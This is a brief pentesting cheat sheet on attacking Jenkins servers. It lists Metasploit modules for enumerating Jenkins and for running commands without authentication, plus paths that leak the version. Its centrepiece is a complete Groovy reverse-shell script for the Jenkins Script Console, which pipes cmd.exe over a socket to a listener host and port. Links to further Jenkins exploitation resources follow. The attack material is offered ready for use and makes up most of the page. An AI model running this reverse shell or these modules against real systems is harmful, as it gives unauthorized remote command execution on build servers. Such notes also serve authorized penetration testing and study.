# 🕴 Jenkins

## Enumeration

```bash
msf> use auxiliary/scanner/http/jenkins_enum

# execute commands without authentication ?
msf> use auxiliary/scanner/http/jenkins_command

# get jenkins version
/oops
/error
```

## RCE from Script Console

> From : [https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)

{% code title="revsh.groovy" %}
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
{% endcode %}

## Resources

{% embed url="https://github.com/gquere/pwn_jenkins" %}

{% embed url="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security" %}
